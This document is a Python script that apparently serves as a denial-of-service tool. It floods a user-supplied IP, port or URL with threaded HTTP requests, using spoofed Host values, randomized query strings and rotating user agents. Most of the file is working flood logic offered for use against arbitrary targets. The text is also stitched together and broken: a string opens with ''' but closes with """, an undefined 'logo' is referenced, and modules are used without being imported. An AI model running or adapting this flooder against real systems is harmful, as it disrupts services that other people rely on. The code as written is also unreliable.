#!/usr/bin/python3
import os
import socket
import threading
import time
import fade
from colorama import Fore, Style
def ddos():
    os.system("clear")
    print("press CTRL + C and press ENTER to exit !!!")
    while True:
        try:
            threads = int(input("ENTER NUMBER OF THREADS : "))
        except ValueError:
            print("please enter a integer value")
            continue;
        else:
            break;
    attack_num = 0
    trget = str(input(Fore.RED + Style.BRIGHT + "ENTER IP OF THE HOST :  "))
    fake = '192.178.1.38'
    #port = 80( default http port is 80)
    while True:
        try:
            port = int(input("ENTER PORT (default port : 80 ) : ") or 80)
        except ValueError:
            print("Please enter a valid port , please try again")
            continue;
        else:
            break;
    print(f"performing Ddos on {trget} on PORT {port} using FAKE IP {fake} ")
    print(Fore.YELLOW + Style.BRIGHT + "[INFO!]" + Fore.WHITE + " if the above information is incorrect,you can restart the script and again enter the details correctly!!")
   # print(Fore.YELLOW + Style.BRIGHT + "[INFO!]" + Fore.WHITE + " Press CTRL + C and press Enter to Exit!")
    #print(Style.BRIGHT + Fore.YELLOW + "[INFO!]" + Fore.WHITE + "Press CTRL + C and press enter to exit!!")
    time.sleep(4)
    print(Fore.MAGENTA + Style.BRIGHT + "DDos starting in ~")
    print("seconds : 3")
    time.sleep(1)
    print("seconds : 2")
    time.sleep(1)
    print("seconds : 1")
    time.sleep(1)

    def attack():
        nonlocal attack_num
        while True:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((trget, port))
                s.sendto(("GET /" + trget + " HTTP/1.1\r\n").encode("ascii"), (trget, port))
                s.sendto(('Host: ' + fake + '\r\n\r\n').encode('ascii'), (trget, port))

                attack_num += 1
                print("[💥]  \033[93mTL-DD0S  \033[32mAttack number \033[97m——> \033[0m"+ str(attack_num))
            except socket.error:
                print('CONNECTION FAILED, HOST MAY BE DOWN OR CHECK IP OR PORT')
                break
                s.close()

    for i in range(threads):
        thread = threading.Thread(target=attack)
        thread.start()
def print_red_centered_art():
    os.system("clear")
    art = '''
══════════════════════════════════════════════════════════════════
                                                                  
  ╔═══╗ ╔═══╗ ╔═══════╗ ╔═╗       ╔═══════╗  ╔══════╗ ╔═╗ ╔═══╗   
  ║▒▒═╗▒╔═╗▒║ ║▒╔═══╗▒║ ║▒║       ║▒╔═══╗▒║  ║▒═════╝ ║▒║ ║▒╔═╝   
  ║▒║ ║▒║ ║▒║ ║▒║   ║▒║ ║▒║       ║▒║   ║▒║  ║▒║      ║▒╚═══╝    
  ║▒║ ║▒║ ║▒║ ║▒╚═══╝▒║ ║▒║       ║▒╚═══╝▒║  ║▒║      ║▒╔═══╗     
  ║▒║ ╚═╩ ║▒║ ║▒╔═══╗▒║ ║▒║═════╗ ║▒╔═══╗▒║  ║▒═════╗ ║▒║ ║▒╚═╗   
  ╚═╝     ╚═╝ ╚═╝   ╚═╝ ╚═══════╝ ╚═╝   ╚═╝  ╚══════╝ ╚═╝ ╚═══╝   
                                                                  
\033[92m   ╔═══╗ ╗     ╔═══╗ ╔══╗ ╗  ╔     ╔═══╗ ╔═══╗ ╔══╗══╗ ╗    ╔\033[0m  
\033[92m   ║   ║ ║     ║   ║ ║    ║  ║     ║   ║ ║   ║ ║  ║  ║ ║    ║\033[0m   
\033[92m   ║══╗╝ ║     ╔═══╗ ║    ║══╝╗    ╔═══╗ ║═══╗ ║  ║  ║  ══╔═ \033[0m   
\033[92m   ╚══╝  ════╝ ╝   ╚ ╚══╝ ╝   ╚    ╝   ╚ ╝   ╚ ╝     ╚    ╚  \033[0m

\033[33m══════════════════════ \033[37mJ A N C O K Z O S A N\033[33m ═════════════════════
"""
faded_text = fade.fire(logo)
print(faded_text)
ask = fade.pinkred("\033[33m⟩⟩URL Target:\033[31m ✓✓ \033[0m")
url = input(ask)
u = int(0)
headers = []
referer = [
    "https://alibaba.com/",
    "https://google.com/",
    ]

def useragent():
    global headers
    headers.append("Mozilla/5.0 (Windows Phone 10.0; Android 6.0.1; Microsoft; RM-1152)")
    headers.append("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)")
    headers.append("Mozilla/5.0 (Linux; Android 6.0.1; SM-G920V Build/MMB29K) AppleWebKit/537.36")
    headers.append("Mozilla/5.0 (Windows; U; Windows NT 5.0; es-ES; rv:1.8.0.3) Gecko/20060426 Firefox/1.5.0.3")
    headers.append("Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0")
    headers.append("Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/36.0  Mobile/15E148 Safari/605.1.15")

    return headers


def genstr(size):
    out_str = ''

    for _ in range(0, size):
        code = random.randint(65, 90)
        out_str += chr(code)
    
    return out_str


class httpth1(threading.Thread):
    def run(self):
        global u
        while True:
            try:
                headers={'User-Agent' : random.choice(useragent()), 'Referer' : random.choice(referer)}
                randomized_url = url + "?" + genstr(random.randint(3, 10))
                requests.get(randomized_url, headers=headers)
                attack_num += 1
                print("[⟨⟩]\033[31m▒" +str(u)+ "▒\033[37m Request Sent ▒\033[33m " +(url)+ "▒=⟩\033[0m" )      
            except requests.exceptions.ConnectionError:
                print("▒ ▒ ▒ \033[1mServer \033[4mMaybe\033[97m ▒ ▒ ▒ \033[35mDown ▒ ▒ \033[0m" )
                pass
            except requests.exceptions.InvalidSchema:
                print ("[Finally attack]")
                raise SystemExit()
            except ValueError:
                print ("[Check Your URL]")
                raise SystemExit()
            except KeyboardInterrupt:
                print("[Canceled by User]")
                raise SystemExit()


while True:
    try:
        th1 = httpth1()
        th1.start()
    except Exception:
        pass
    except KeyboardInterrupt:
        exit("[Canceled By User]")
        raise SystemExit()
